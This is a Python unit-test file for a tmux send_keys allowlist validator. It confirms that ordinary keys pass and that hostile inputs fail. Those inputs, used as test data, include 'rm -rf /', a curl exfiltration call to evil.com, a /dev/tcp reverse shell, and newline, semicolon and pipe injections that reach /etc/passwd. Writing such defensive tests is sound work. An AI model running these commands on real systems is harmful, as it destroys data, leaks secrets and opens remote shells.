"""Unit tests for tmux send_keys allowlist."""

import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))
from security import validate_tmux_key, ALLOWED_TMUX_KEYS


def test_enter_allowed():
    assert validate_tmux_key("Enter") == (True, "ok")


def test_control_sequences_allowed():
    for key in ["C-c", "C-d", "C-z", "C-l", "C-a", "C-e", "C-k", "C-u",
                "C-r", "C-p", "C-n", "C-b", "C-f", "C-w"]:
        assert validate_tmux_key(key) == (True, "ok"), f"{key} should be allowed"


def test_navigation_keys_allowed():
    for key in ["Up", "Down", "Left", "Right", "Home", "End", "PageUp", "PageDown"]:
        assert validate_tmux_key(key) == (True, "ok"), f"{key} should be allowed"


def test_function_keys_allowed():
    for i in range(1, 13):
        assert validate_tmux_key(f"F{i}") == (True, "ok")


def test_special_keys_allowed():
    for key in ["Escape", "Tab", "BTab", "Space", "BSpace", "IC", "DC"]:
        assert validate_tmux_key(key) == (True, "ok"), f"{key} should be allowed"


def test_meta_keys_allowed():
    for key in ["M-b", "M-f", "M-d"]:
        assert validate_tmux_key(key) == (True, "ok")


def test_confirmation_chars_allowed():
    for key in ["y", "n", "q"]:
        assert validate_tmux_key(key) == (True, "ok")


def test_shell_command_blocked():
    ok, msg = validate_tmux_key("rm -rf /")
    assert ok is False
    assert "not in allowed set" in msg


def test_curl_exfiltration_blocked():
    ok, _ = validate_tmux_key("curl https://evil.com/steal")
    assert ok is False


def test_reverse_shell_blocked():
    ok, _ = validate_tmux_key("bash -i >& /dev/tcp/evil.com/4444 0>&1")
    assert ok is False


def test_arbitrary_text_blocked():
    ok, _ = validate_tmux_key("hello world")
    assert ok is False


def test_single_arbitrary_char_blocked():
    ok, _ = validate_tmux_key("a")
    assert ok is False
    ok, _ = validate_tmux_key("x")
    assert ok is False


def test_empty_string_blocked():
    ok, _ = validate_tmux_key("")
    assert ok is False


def test_newline_injection_blocked():
    ok, _ = validate_tmux_key("Enter\nrm -rf /")
    assert ok is False


def test_semicolon_injection_blocked():
    ok, _ = validate_tmux_key("q; rm -rf /")
    assert ok is False


def test_pipe_injection_blocked():
    ok, _ = validate_tmux_key("q | cat /etc/passwd")
    assert ok is False


def test_case_sensitivity():
    ok, _ = validate_tmux_key("enter")
    assert ok is False
    ok, _ = validate_tmux_key("ENTER")
    assert ok is False


def test_allowlist_size():
    assert len(ALLOWED_TMUX_KEYS) == 48


if __name__ == "__main__":
    tests = [v for k, v in sorted(globals().items()) if k.startswith("test_")]
    for t in tests:
        t()
        print(f"  PASS: {t.__name__}")
    print(f"\nAll {len(tests)} send_keys tests passed!")
